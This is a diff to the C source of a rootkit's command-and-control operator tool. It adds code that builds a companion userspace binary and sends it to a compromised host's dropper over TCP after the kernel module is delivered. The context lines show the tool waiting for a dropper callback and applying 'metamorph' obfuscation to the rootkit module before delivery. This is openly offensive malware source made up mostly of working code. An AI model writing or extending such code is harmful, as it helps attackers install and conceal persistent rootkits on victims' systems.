@@ -25,6 +25,8 @@
 
 #include <arpa/inet.h>
 #include <ctype.h>
+#include <libgen.h>
+#include <limits.h>
 #include <netinet/in.h>
 #include <stdint.h>
 #include <stdio.h>
@@ -263,11 +265,13 @@ static int wait_dropper(uint16_t lport, char *kver_out, size_t kver_max)
  * @param out_sz  Size of ko_out.
  * @return        0 on success, -1 on build failure.
  */
-static int build_module(const char *kver, char *ko_out, size_t out_sz)
+static int build_module(const char *kver, char *ko_out, size_t out_sz,
+                        char *comp_out, size_t comp_sz)
 {
     char cmd[256];
     int  ret;
     char rk_name[128];
+    char bin_name[128];
     FILE *f;
 
     printf(CYAN "[*]" RESET " building for kernel " BOLD "%s" RESET " ...\n",
@@ -281,6 +285,11 @@ static int build_module(const char *kver, char *ko_out, size_t out_sz)
         return -1;
     }
 
+    /* also build companion (static) */
+    snprintf(cmd, sizeof(cmd),
+             "make -C " ROOTKIT_DIR " userspace 2>&1");
+    system(cmd); /* best-effort */
+
     f = fopen(ROOTKIT_DIR "/.rk_name", "r");
     if (!f || !fgets(rk_name, sizeof(rk_name), f)) {
         if (f) fclose(f);
@@ -288,9 +297,21 @@ static int build_module(const char *kver, char *ko_out, size_t out_sz)
     }
     fclose(f);
     rk_name[strcspn(rk_name, "\n")] = '\0';
-
     snprintf(ko_out, out_sz, ROOTKIT_DIR "/%s.ko", rk_name);
     printf(GREEN "[+]" RESET " module built : " BOLD "%s\n" RESET, ko_out);
+
+    /* companion path */
+    f = fopen(ROOTKIT_DIR "/.rk_bin_name", "r");
+    if (f && fgets(bin_name, sizeof(bin_name), f)) {
+        fclose(f);
+        bin_name[strcspn(bin_name, "\n")] = '\0';
+        snprintf(comp_out, comp_sz, ROOTKIT_DIR "/%s", bin_name);
+        printf(GREEN "[+]" RESET " companion : " BOLD "%s\n" RESET, comp_out);
+    } else {
+        if (f) fclose(f);
+        comp_out[0] = '\0';
+    }
+
     return 0;
 }
 
@@ -569,6 +590,7 @@ static void cmd_set(c2_cfg_t *cfg, const char *opt, const char *value)
 static void cmd_run(c2_cfg_t *cfg)
 {
     char ko_path[256];
+    char comp_path[256];
     int  sock = -1;
 
     /* TCP/HTTP : le dropper se connecte à nous → TARGET pas requis.
@@ -614,7 +636,9 @@ static void cmd_run(c2_cfg_t *cfg)
         }
     }
 
-    if (build_module(cfg->kver, ko_path, sizeof(ko_path)) < 0)
+    comp_path[0] = '\0';
+    if (build_module(cfg->kver, ko_path, sizeof(ko_path),
+                     comp_path, sizeof(comp_path)) < 0)
         goto out;
 
     if (apply_metamorph(ko_path) < 0)
@@ -622,6 +646,33 @@ static void cmd_run(c2_cfg_t *cfg)
 
     if (deliver(cfg, ko_path, sock) < 0)
         goto out;
+
+    /* send companion binary on the same socket (TCP only) */
+    if (comp_path[0] != '\0' && cfg->protocol == PROTO_TCP) {
+        FILE    *cf   = fopen(comp_path, "rb");
+        uint8_t *cbuf = NULL;
+        long     csz  = 0;
+
+        if (cf) {
+            fseek(cf, 0, SEEK_END);
+            csz = ftell(cf);
+            rewind(cf);
+            cbuf = malloc((size_t)csz);
+            if (cbuf) {
+                fread(cbuf, 1, (size_t)csz, cf);
+                uint32_t u32 = (uint32_t)csz;
+                if (send_exact(sock, &u32, sizeof(u32)) == 0 &&
+                    send_exact(sock, cbuf, u32) == 0)
+                    printf(GREEN "[+]" RESET " companion sent (%u bytes)\n", u32);
+                else
+                    printf(RED "[-]" RESET " companion send failed\n");
+                free(cbuf);
+            }
+            fclose(cf);
+        } else {
+            printf(YELLOW "[!]" RESET " companion not found, skipping\n");
+        }
+    }
 
     printf(GREEN "[+]" RESET " payload delivered successfully\n");
 
@@ -669,9 +720,21 @@ int main(int argc, char *argv[])
     char    *cmd;
     char    *arg1;
     char    *arg2;
+    char     self[PATH_MAX];
+    ssize_t  len;
 
     (void)argc;
     (void)argv;
+
+    /* chdir to the project root (parent of c2/) so that
+     * "rootkit_module" and "metamorph" paths resolve correctly
+     * regardless of where the operator launches the binary from. */
+    len = readlink("/proc/self/exe", self, sizeof(self) - 1);
+    if (len > 0) {
+        self[len] = '\0';
+        /* self = .../rootkit/c2/c2  → dirname twice → .../rootkit */
+        chdir(dirname(dirname(self)));
+    }
 
     memset(&cfg, 0, sizeof(cfg));
     cfg.port     = DEFAULT_PORT;
